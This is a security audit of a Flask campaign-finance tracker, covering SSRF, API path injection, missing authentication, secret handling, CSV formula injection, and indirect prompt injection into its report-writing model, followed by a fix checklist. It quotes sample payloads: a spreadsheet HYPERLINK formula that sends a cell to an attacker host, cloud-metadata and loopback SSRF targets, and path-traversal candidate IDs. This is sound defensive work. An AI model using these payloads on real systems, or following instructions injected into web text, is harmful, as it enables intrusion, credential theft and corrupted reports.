# Security Audit — Campaign Tracker
**Scope:** SSRF, injection, directory traversal, env/secret exposure, missing controls
**Commit:** `7191d28` · **Branch:** `claude/security-audit-ssrf-injection-a6415o`
**Files reviewed:** `app.py`, `fec.py`, `congress.py`, `votes.py`, `statements.py`, `synthesis.py`, `reconcile.py`, `steps.py`, `timeline.py`, `static/app.js`, `static/export.js`, `templates/index.html`, `docker/searxng/*`, `run.sh`

---

## CRITICAL

**[CRITICAL · `statements.py:398` (`_http_get`), reached via `statements.py:453-470` (`_page_fetch_pass`) ← `statements.py:172` · Attack Vector: The dating tier-2 pass fetches every undated statement URL. Those URLs come verbatim from SearXNG engine results (`statements.py:131`) with no allowlist, no scheme restriction beyond `str.startswith("http")`, no DNS/IP resolution check, and no block on RFC1918 / loopback / link-local / `.internal` hosts. Both transports (`curl_cffi` and `urllib`) follow 3xx automatically, so even a hostname check would be bypassable by redirect. An attacker who gets one page indexed for `"<candidate name>" campaign finance` (10 fixed query angles, `statements.py:56-60`) steers the server at internal targets. · Impact: Server-side request forgery from the app host into the operator's private network — internal service enumeration, cloud metadata reachability, and state-changing GET requests against unauthenticated internal endpoints. The `Content-Type` gate at `:408`/`:415` limits body return to `html`/`xml`, so exfiltration is partial; the *request itself* is unconditional, and a parsed date reaching `result.track_b_statements` plus response-timing differences give a workable oracle for host/port enumeration. · Confidence: HIGH — full path traced end to end.]**

**[CRITICAL · `statements.py:423-435` (`_canonical_target`) → `statements.py:447` · Attack Vector: After fetching a page, the code reads that page's own `<link rel="canonical">` / `og:url` and issues a second `_http_get` against it, gated only on `target.startswith("http")` and inequality with the original URL. The hop target is fully attacker-controlled HTML. · Impact: This removes the search-ranking precondition from the finding above. A single indexed attacker page becomes an arbitrary-URL fetch primitive — one page, then `<link rel="canonical" href="http://169.254.169.254/…">` or `http://127.0.0.1:<port>/…`. Full SSRF redirection with no allowlist at either hop. · Confidence: HIGH — the code comment explicitly frames this as "a single, safe redirect hop"; the safety argument (it is the page's own declared target) holds for *dating provenance*, not for *network egress*, and the two are conflated here.]**

---

## HIGH

**[HIGH · `app.py:655` → `app.py:229` → `fec.py:1258` and `fec.py:1304` · Attack Vector: `candidate_id` is taken from the POST body, `.strip()`ed, and given zero format validation. When present, the resolve step trusts it outright ("The user confirmed an exact FEC candidate … trust it") and it is interpolated **unencoded** into the API path: `f"{FEC_BASE}/candidate/{candidate_id}/totals/?{urlencode(params)}"`. Verified shapes: `../../../v1/candidates/search`, `X?per_page=1&`, `A#`. FEC candidate IDs are a fixed grammar (`^[HSP][0-9A-Z]{8}$`) that is never enforced. · Impact: URL path and query-parameter injection against `api.open.fec.gov`, with the server's `FEC_API_KEY` attached to every injected request. Host is fixed, so this is not a redirect-to-attacker primitive, but it does let an unauthenticated caller reach arbitrary endpoints and parameters on the upstream API using the operator's shared credential, and to corrupt request semantics (e.g. truncating the intended path with `#`). · Confidence: HIGH — traced and reproduced the constructed URLs.]**

**[HIGH · `app.py:658` → `app.py:229` → `congress.py:303` · Attack Vector: Same class. `state` from the POST body flows unvalidated to `resolve_member()`, which builds `f"{CONGRESS_BASE}/member/{state.upper()}?{urlencode(params)}"`. `.upper()` is the only transformation; `/`, `?`, `#`, `..` all survive. · Impact: Path/parameter injection against `api.congress.gov` carrying `CONGRESS_API_KEY`. Same bounded-host caveat as above. · Confidence: HIGH.]**

**[HIGH · `app.py:705` (`app.run(host="0.0.0.0")`) + `templates/index.html` + `app.py:657-663` · Attack Vector: The app binds all interfaces with no authentication, no authorization, and no TLS on any route. The Anthropic API key is collected in a browser field and POSTed in a cleartext HTTP request body (`anthropic_key`, `app.py:650`). Anyone who can reach the port can run jobs; anyone on-path can read the key in transit. · Impact: Unauthenticated use of the operator's FEC/Congress quota; plaintext interception of a user's Anthropic credential. The in-code hardening around that key is real and well done — it never enters `JOBS`, the result, the StepLog, or any `/status` response (verified by inspection) — but that protection ends at the network boundary, which is unprotected. Production blocker for any non-loopback deployment. · Confidence: HIGH.]**

**[HIGH · `run.sh:18,21,30` (git-tracked: confirmed in `git ls-files`) · Attack Vector: The documented and only supported key workflow instructs the operator to paste `FEC_API_KEY` and `CONGRESS_API_KEY` into `run.sh` — a file under version control. `.gitignore` covers `.env`, `venv/`, `__pycache__/` but not `run.sh`. · Impact: Live API credentials committed and pushed on the next `git add -A` / `git commit -a`. History scan of all 38 commits found no leaked key to date, so this is latent, not realized — but the design actively steers the operator into it. · Confidence: HIGH — scanned `git rev-list --all` for high-entropy assignments; clean.]**

**[HIGH · `docker/searxng/settings.yml:32` vs `docker/searxng/README.md:14`, `docker-compose.yml:12`, `README.md:257` · Attack Vector: `settings.yml` ships a hardcoded literal `secret_key: "e2bctgctyctycytc"`. Setup instructions rotate it with `sed -i "s|ultrasecretkey|$(openssl rand -hex 32)|g" settings.yml` — but the string `ultrasecretkey` **does not appear anywhere in the file**. The in-file comment names a third, also-absent placeholder (`e2bckiiubpiubvuib`). The rotation step is a silent no-op that exits 0. · Impact: Every clone runs SearXNG with the same publicly-known session secret. Mitigated in the shipped topology by the 127.0.0.1 port bind (`docker-compose.yml:37`), but the documented "hardened / cloud-hosted" path in `CLAUDE.md` inherits the dead rotation step, and an operator following the README has no signal it failed. · Confidence: HIGH — verified all three strings by grep.]**

---

## MEDIUM

**[MEDIUM · `static/export.js:20-31` (`csvCell`) · Attack Vector: The CSV encoder implements RFC-4180 quoting correctly and nothing else. No neutralization of leading `=`, `+`, `-`, `@`, tab, or CR. Cell content includes statement titles and excerpts harvested from arbitrary indexed web pages (`statements.py:131-136`) and FEC free-text committee/employer/occupation fields. · Impact: CSV formula injection. A crafted page title (`=HYPERLINK("http://attacker/?x="&A1,"click")` or a DDE payload) lands in `statements.csv` / `search_log.csv`, executing when the researcher opens the export in Excel or LibreOffice. Directly relevant given export-to-spreadsheet is a core workflow of this tool. · Confidence: HIGH — encoder read in full; no sanitization exists.]**

**[MEDIUM · `synthesis.py:544-560` (`build_digest`) → `synthesis.py:788` · Attack Vector: Statement excerpts sourced from arbitrary third-party web pages are placed into the model prompt as untrusted data with no delimiting, provenance marking, or instruction-injection defense. `SYSTEM_PROMPT` (`synthesis.py:95+`) constrains the model's *sourcing* ("PROVIDED DATA ONLY", no verdicts) but never tells it that any portion of the JSON is adversarial input rather than instructions. · Impact: Indirect prompt injection — a page indexed under the candidate's name can carry text aimed at the report layer, attempting to introduce a verdict, suppress a caveat, or alter framing. This attacks the project's stated integrity guarantee specifically. Partially contained by design: `reconcile.py` deterministically checks spender sides, cycle totals, dollar provenance, and caveat preservation, and the Money Picture and spender ledger are machine-rendered — so injected *numbers* and *sides* are caught. Injected qualitative framing in the model's connective prose is not covered by any of the four checks. · Confidence: MEDIUM-HIGH — mechanism confirmed; residual exploitability depends on prose the guards do not police.]**

**[MEDIUM · `app.py:583-590` · Attack Vector: Rate limiting is entirely optional — `flask-limiter` missing degrades `search_limit` to a no-op decorator that returns the function unchanged, with no startup warning. When present: `default_limits=[]` (so only `/search` and `/candidates` are limited, at 20/min), default in-memory storage (resets on restart, not shared across workers), and `key_func=get_remote_address` with no `ProxyFix`. `/status/<job_id>` and `/health` are unlimited. · Impact: Behind any reverse proxy every client collapses into one bucket keyed on the proxy IP — one user exhausts the limit for all. With `flask-limiter` absent there is no limit at all. Each allowed `/search` triggers hundreds of paced upstream API calls, so the effective amplification per request is very high. · Confidence: HIGH.]**

**[MEDIUM · `app.py:661-663`, `app.py:82-87`, `statements.py:293` · Attack Vector: Every `/search` spawns an unbounded `threading.Thread` with no concurrency ceiling, no queue, and no per-client job cap. Each job spawns a further 8-worker `ThreadPoolExecutor` for page fetches. `_sweep_old_jobs()` is called only from the `/search` handler, and `JOBS` retains the complete result JSON (up to 5,000 donor transactions, `app.py:154`) for a 1800s TTL. · Impact: Resource exhaustion — thread and memory pressure from concurrent job submission; `JOBS` growth is bounded only by TTL and request rate. Compounded by the rate-limiting weaknesses above. · Confidence: HIGH.]**

**[MEDIUM · `statements.py:404-411` · Attack Vector: On the `curl_cffi` path, `_FETCH_MAX_BYTES` is applied as `resp.text[:_FETCH_MAX_BYTES]` — a slice **after** the non-streaming `.get()` has already downloaded and decoded the entire response body. The `urllib` fallback at `:418` bounds correctly via `resp.read(n)`; the primary path does not. · Impact: The documented 256 KB read bound does not hold on the transport actually used in production. A malicious or merely large page (or an internal endpoint streaming indefinitely) is read fully into memory, 8 concurrent. Memory-exhaustion DoS combined with the SSRF above. · Confidence: HIGH — the ordering is unambiguous in the source.]**

**[MEDIUM · `app.py:602-604`, `app.py:634-636`, `app.py:609`/`:638` · Attack Vector: No CSRF token on either POST route, and both accept `request.form` as a fallback when JSON parsing fails — which makes them reachable by a cross-origin HTML form POST as a CORS "simple request", requiring no preflight and no cooperation from the browser. · Impact: A visited web page can force jobs on any reachable instance, burning the shared FEC/Congress quota and triggering the full outbound pipeline. The attacker cannot read the response (no CORS headers set, and `job_id` is a 128-bit UUID4 — adequate), so this is write-only forcing rather than data theft; DNS rebinding against the `0.0.0.0` bind would lift that limit. · Confidence: MEDIUM-HIGH.]**

**[MEDIUM · `app.py:592-596`, `templates/index.html` · Attack Vector: Only `X-Content-Type-Options` and `X-Frame-Options` are set. No `Content-Security-Policy`, no `Referrer-Policy`, no `Permissions-Policy`, no HSTS. `templates/index.html` has no CSP meta tag. · Impact: No defense-in-depth layer behind the app's client-side escaping. Note this is a missing *control*, not an exploitable hole: I reviewed every `innerHTML` sink in `static/app.js` (lines 77, 174, 186, 198, 414, 518, 583, 652, 740, 743) and escaping is applied correctly and consistently — `escapeHtml` (`:95`) covers `& < > " '` including attribute contexts, `mdToHtml` (`:303`) escapes before applying `**bold**` and parses no links (so no `javascript:` href sink), and the SVG builders escape all interpolated labels and `<title>` text. A CSP would still be the correct backstop for a page rendering model output and third-party web excerpts. · Confidence: HIGH.]**

**[MEDIUM · `docker/searxng/settings.yml:23-28` + `app.py:705` · Attack Vector: `server.limiter` is deliberately left `false` and the JSON API is unauthenticated — a sound decision *given* the 127.0.0.1 bind. But the Flask app on the same host binds `0.0.0.0`. · Impact: The security of the SearXNG instance rests entirely on one loopback bind, on a host that is deliberately exposing another service to the network. Any SSRF in the Flask app (see CRITICAL findings) reaches `http://127.0.0.1:8080` as an open search proxy. The two decisions are individually reasonable and jointly unsafe. · Confidence: MEDIUM-HIGH.]**

**[MEDIUM · `statements.py:190-197` (`_searxng_search`) · Attack Vector: `SEARXNG_URL` is concatenated as `base_url.rstrip("/") + "/search?" + …` with no scheme or shape validation. Operator-controlled today (`app.py:450` reads it from env; the `searxng_url` parameter is never user-reachable), so not currently attacker-triggerable. · Impact: Latent SSRF/exfiltration sink if a future change ever surfaces this as a request-scoped or per-user setting — the search query, which contains the candidate name, would go to any host set there. Flagged as a design-boundary risk, not a live vulnerability. · Confidence: MEDIUM — reachability today is closed; noting it because the `_search` seam is explicitly documented as pluggable.]**

---

## LOW / INFORMATIONAL

**[LOW · `votes.py:36, 202, 241, 310` · Attack Vector: `xml.etree.ElementTree.fromstring()` parses remote XML from `senate.gov` LIS endpoints. ElementTree is documented-vulnerable to entity-expansion ("billion laughs") and quadratic blowup; it is *not* vulnerable to external entity expansion or DTD retrieval, so classic XXE file disclosure does not apply. · Impact: Parser-level DoS requires controlling the `senate.gov` response — a fixed HTTPS host with no user-controlled path component (URLs built from integers at `:184`/`:188`). Realistic only under MITM or upstream compromise. · Confidence: HIGH on the mechanism, LOW on exploitability.]**

**[LOW · `app.py:682-684` (`/health`) · Attack Vector: Unauthenticated endpoint returns `{"has_fec_key": bool(...)}`. · Impact: Discloses whether the instance holds a live credential — reconnaissance value only, distinguishing a real deployment from a demo instance worth targeting. · Confidence: HIGH.]**

**[LOW · `app.py:704` · Attack Vector: `FLASK_DEBUG=1` enables the Werkzeug interactive debugger. · Impact: RCE for anyone reaching the port, given the `0.0.0.0` bind. The default is correctly OFF and the inline comment explains the risk accurately — flagged only because the opt-in and the all-interfaces bind sit two lines apart with no guard coupling them. · Confidence: HIGH.]**

**[LOW · `static/app.js:578` · Attack Vector: `href="${escapeHtml(v.url)}"` escapes quotes correctly but applies no scheme allowlist. `v.url` is server-generated from fixed `clerk.house.gov` / `senate.gov` templates (`votes.py:112, 184, 188`), so it is not currently attacker-influenced. · Impact: None today; a latent `javascript:` sink if citation URLs ever become data-derived. · Confidence: MEDIUM.]**

---

## Areas Reviewed — No Findings

| Area | Result |
|---|---|
| **Command / code injection** | **CLEAR.** No `subprocess`, `os.system`, `os.popen`, `eval`, `exec`, `__import__`, `pickle`, `yaml.load`, or `shell=True` anywhere in the Python or JS. No shell interpolation surface exists. |
| **Directory traversal** | **CLEAR.** The only filesystem writes are `synthesis.py:577` (`_cache_paths`), keyed on a SHA-256 hexdigest (`:572`) — no user-controlled path component. No file-serving route beyond Flask's built-in `/static/`. No `send_file`, no `open()` on request data. |
| **Client-side XSS** | **CLEAR** (control gap noted above as missing CSP). All 10 `innerHTML` sinks reviewed; escaping correct and consistent, including attribute contexts and SVG `<title>` nodes. |
| **API key leakage into responses/logs** | **CLEAR.** FEC and Congress error messages carry status code and body snippet only, never the request URL — verified across all `raise FECAPIError` / `CongressAPIError` sites. `_friendly_api_error` (`synthesis.py`) returns a parsed one-liner, not raw error JSON. The Anthropic key never enters `JOBS`, the result, the StepLog, or `/status`. No `logging` configured; `print()` calls are CLI-path only and key-free. |
| **Job ID predictability** | **CLEAR.** `uuid.uuid4().hex` (`app.py:69`) — 122 bits of entropy; enumeration infeasible. |
| **Secrets in git history** | **CLEAR.** All 38 commits scanned for high-entropy credential assignments across `*.py`, `*.sh`, `*.yml`, `*.env*`. No hits. (The `run.sh` risk above is latent, not realized.) |

---

## Production Blockers

Ranked by what I would gate a deployment on:

1. **SSRF via `_canonical_target` + `_http_get`** — arbitrary internal-network egress from one indexed page.
2. **No authentication + `0.0.0.0` + cleartext HTTP** — including a user credential in a plaintext POST body.
3. **Unvalidated `candidate_id` / `state` into upstream API paths**, carrying server-held keys.
4. **`run.sh` as the tracked home for live API keys.**
5. **SearXNG `secret_key` rotation that silently does nothing.**

The pipeline's data-integrity engineering is genuinely strong — the StepLog gating, `reconcile.py`, the deterministic ledger and Money Picture, and the disclosed-not-faked discipline are all doing real work, and several classes of bug that plague this kind of tool are structurally closed. The gap is that the same rigor has not been applied to the *network and input boundary*: data arriving from the open web (`statements.py`) and from the client (`app.py`) is trusted at a level the rest of the codebase would never extend to a dollar figure.

---

## Hardening Checklist — path to open-sourcing

Phases are ordered by the same ranking as the findings above (CRITICAL → HIGH →
MEDIUM → LOW). **Do not open-source before Phase 1 and Phase 2 are both
checked off** — those are the findings that let an outside party pivot into the
operator's network or burn/steal their credentials. Phase 3 and 4 are real but
lower-blast-radius; reasonable to ship a v1 with a couple of Phase 3 items open
if they're called out in the README, as long as Phase 1–2 are clean.

Each box should only be checked once: (a) the code change is made, (b) it's
been checked against how that module is actually used elsewhere in the
pipeline (does it still behave correctly for a normal run — demo mode, a real
candidate, cached synthesis, etc.), and (c) there's a regression test pinning
the fix so it can't silently regress.

### Phase 1 — CRITICAL: stop outbound SSRF from `statements.py` ✅ DONE

- [x] **Guard every page fetch behind a resolved-IP allowlist check**
      (`statements.py:_http_get`, reached from `_page_fetch_pass`). Add
      `_is_safe_url()`: parses scheme (http/https only), resolves the host via
      `socket.getaddrinfo`, and rejects loopback / RFC1918 private / link-local
      (covers `169.254.169.254` cloud metadata) / multicast / reserved /
      unspecified — including the IPv4-mapped-IPv6 tunnel case. Fails closed on
      any DNS error.
- [x] **Close the redirect bypass** — both `curl_cffi` and `urllib` were
      auto-following 3xx responses, which defeats a hostname-only check.
      Redirects are now followed manually (`allow_redirects=False` /
      `_CapturingRedirectHandler`), with `_is_safe_url()` re-run on **every**
      hop before it's requested, bounded by `_MAX_REDIRECTS` so a redirect loop
      can't hang the fetch.
- [x] **Re-verify the canonical/og:url hop is covered, not just documented as
      safe** — `_canonical_target()`'s docstring now says explicitly that it
      only vouches for *dating provenance*, not network safety; the actual
      network guard lives in `_http_get`, which the canonical target is always
      routed back through before it's fetched.
- [x] **Confirm the fix doesn't regress the feature it's protecting** — the
      dating tier-2 pass (page-fetch date recovery) still needs to work for
      the overwhelming majority of real news/campaign/government pages, which
      all resolve to public IPs. The guard only blocks resolution to
      internal/reserved ranges, so normal operation is unaffected; verified via
      `tests/test_ssrf_guard.py`.
- [x] **Regression test** — `tests/test_ssrf_guard.py`: private/loopback/
      link-local/metadata/multicast/unspecified/IPv4-mapped-IPv6 all rejected;
      non-http(s) schemes rejected; unresolvable host fails closed; the
      transport is proven *never invoked* for an unsafe host (not just that
      its result is discarded); a redirect into a private target is refused
      and the private URL is never fetched; a redirect chain between two safe
      hosts still works (feature preserved); a redirect loop terminates at
      `_MAX_REDIRECTS` instead of hanging. Run: `python3 tests/test_ssrf_guard.py`.

### Phase 2 — HIGH: input validation, transport, and secret handling

- [ ] **Validate `candidate_id` against FEC's real grammar** before it reaches
      `fec.py:funding_by_cycle` / `search_fec_candidate` — enforce
      `^[HSP][0-9A-Z]{8}$` in `app.py` at the point it's read from the POST
      body (`app.py:655`), reject with a 400 otherwise. Re-check that the
      "Did You Mean?" resolver flow (`app.py`'s two-phase `/candidates` →
      `/search`) still passes a well-formed id through the happy path — this
      must not break normal candidate selection.
- [ ] **Validate `state`** the same way (`app.py:658` → `congress.py:303`) —
      two-letter USPS code allowlist (or a regex `^[A-Z]{2}$` post-`.upper()`)
      before it's interpolated into the Congress.gov member-lookup path.
      Confirm every real state/territory FEC returns (incl. DC, territories
      Congress.gov actually covers) still resolves.
- [ ] **Get authentication in front of any non-loopback deployment.** At
      minimum: document in the README that binding `0.0.0.0` requires a
      reverse proxy doing TLS + auth (Basic Auth, an OAuth proxy, Tailscale,
      etc.) in front of it — same posture the SearXNG container already takes.
      Consider defaulting `app.run(host=...)` to `127.0.0.1` and requiring an
      explicit opt-in (env var or flag) to bind wider, so the insecure default
      an open-source cloner gets by just running the app is the safe one.
- [ ] **Stop the Anthropic key traveling in a plaintext POST body** on any
      non-TLS deployment — this is really the same fix as the item above (TLS
      via reverse proxy); note in the README that the "UI-only, never an env
      var" design is only as safe as the transport it rides on.
- [ ] **Get `run.sh` out of the credential path.** Switch the documented setup
      flow to a `.env` file (already `.gitignore`'d) loaded via
      `python-dotenv` or a plain `source .env`, or have `run.sh` read from
      environment variables that are never itself committed with real values
      — ship `run.sh` with empty/placeholder slots only, and a loud comment
      telling the operator to use `.env` or `export` instead of editing it in
      place. Update `CLAUDE.md`'s quick-start section to match (currently
      tells the operator to paste keys directly into `run.sh`).
- [ ] **Fix the SearXNG `secret_key` rotation no-op.** The `sed` command
      targets a placeholder string (`ultrasecretkey`) that doesn't exist in
      `settings.yml`; fix `docker/searxng/settings.yml` to actually contain
      that placeholder (or rewrite the setup instructions/README to match
      whatever placeholder really is in the file), so `openssl rand -hex 32`
      actually lands. Verify post-fix by grepping the file after running the
      documented setup step and confirming the key changed.
- [ ] **Regression / verification pass for this phase** — a lightweight test
      or manual checklist item per fix: a malformed `candidate_id` (path
      traversal, injected `#`/`?`) is rejected with a 400 and never reaches
      `fec.py`; a malformed `state` is rejected before reaching
      `congress.py`; a fresh `docker/searxng` setup produces a *different*
      `secret_key` than the shipped default.

### Phase 3 — MEDIUM: defense-in-depth and resource limits

- [ ] **Neutralize CSV formula injection** in `static/export.js:csvCell` —
      prefix a leading `=`, `+`, `-`, `@`, tab, or CR in any cell value with a
      `'` (or wrap per the OWASP CSV-injection guidance) before RFC-4180
      quoting. Check this doesn't corrupt legitimate values that start with
      those characters (e.g. a negative dollar figure in a transactions
      export) — the prefix should be visually inert when opened, not change
      the underlying number.
- [ ] **Mark untrusted data as untrusted in the synthesis prompt**
      (`synthesis.py:build_digest` → the model call). Add explicit delimiting/
      framing around statement excerpts sourced from the open web — e.g. wrap
      them in a clearly-labeled block with an instruction that the enclosed
      text is data, never instructions, mirroring the existing "PROVIDED DATA
      ONLY" framing. This is prompt-hardening, not a code guarantee — the
      real backstop stays `reconcile.py`; don't let this item substitute for
      it. Re-run a couple of cached vs. fresh synthesis calls to confirm the
      report's prose quality doesn't degrade from the added framing.
- [ ] **Make `flask-limiter` a hard dependency**, not an optional degrade-to-
      no-op — add it to `requirements.txt` if it isn't pinned there, and fail
      startup loudly (or at least log a clear warning) if it's missing rather
      than silently disabling rate limiting. Add `ProxyFix` so `key_func`
      reads the real client IP behind a reverse proxy instead of collapsing
      every client onto the proxy's address. Extend limits to `/status` and
      confirm normal polling (the frontend's live `/status` loop) doesn't get
      throttled by whatever limit is chosen.
- [ ] **Cap concurrent jobs.** Add a bounded queue or a simple semaphore around
      job creation in `app.py` so an unbounded `threading.Thread` isn't
      spawned per `/search`, and confirm `_sweep_old_jobs()` still runs
      predictably under load. Verify a normal multi-tab research session (a
      few concurrent searches) still works after the cap is added.
- [ ] **Fix the `curl_cffi` read-bound bypass** — `statements.py`'s primary
      transport downloads the full response before slicing to
      `_FETCH_MAX_BYTES`; switch to `curl_cffi`'s streaming mode (or an
      explicit content-length check) so the 256 KB cap holds on the path
      that's actually used in production, matching what the `urllib` fallback
      already does correctly.
- [ ] **Add CSRF protection** on `/search` and `/candidates` — a same-site
      cookie flag plus a simple per-session token is enough given there's no
      auth system yet; reject `request.form` fallback parsing if it doesn't
      carry the token. Confirm the frontend (`static/app.js`) is updated to
      send whatever token mechanism is added, or normal searches from the
      bundled UI will start failing.
- [ ] **Add missing security headers** — `Content-Security-Policy`,
      `Referrer-Policy`, `Permissions-Policy`, and HSTS (once TLS is in front
      of the app) alongside the existing `X-Content-Type-Options` /
      `X-Frame-Options`. Test the CSP against the actual page — inline
      `<script>`/`<style>` in `templates/index.html` will need either a nonce
      or to move into `static/`, so check the page still renders and all four
      charts + the swimlane still draw before calling this done.
- [ ] **Validate `SEARXNG_URL`** the same way as the page-fetch guard (Phase 1)
      if/when it ever becomes request-scoped rather than operator/env-only —
      not urgent while it's env-only, but worth a one-line comment in
      `statements.py` pointing future editors at `_is_safe_url()` so this
      doesn't get reintroduced as a live SSRF later.

### Phase 4 — LOW / INFORMATIONAL: cheap wins before release

- [ ] **Guard against XML entity-expansion DoS** in `votes.py`'s
      `ElementTree.fromstring()` calls — switch to `defusedxml` (drop-in
      replacement) for the LIS XML parsing, or accept the risk explicitly in
      a comment given the fixed `senate.gov` host with no user-controlled
      path. Cheap either way; `defusedxml` is a one-import change.
- [ ] **Decide on `/health`'s `has_fec_key` disclosure** — either accept it
      (low value to an attacker) or drop the field for an unauthenticated
      caller once Phase 2's auth-in-front-of-`0.0.0.0` lands.
- [ ] **Couple the `FLASK_DEBUG` opt-in to the bind address** — refuse to
      start (or print a loud warning) if `FLASK_DEBUG=1` AND the host isn't
      loopback, so the two settings can't accidentally combine into a remote
      Werkzeug debugger.
- [ ] **Add a scheme allowlist on `static/app.js:578`'s citation links**
      (`http`/`https` only) even though `votes.py` only emits fixed
      `clerk.house.gov`/`senate.gov` URLs today — cheap insurance against a
      future change making citation URLs data-derived.
- [ ] **Final pass**: re-read this file's "Areas Reviewed — No Findings" table
      and spot-check that nothing above reopened one of those (e.g. the CSP
      work in Phase 3 shouldn't introduce a new `innerHTML` sink; the
      `candidate_id`/`state` validation in Phase 2 shouldn't introduce a new
      injection point in the validation regex itself).
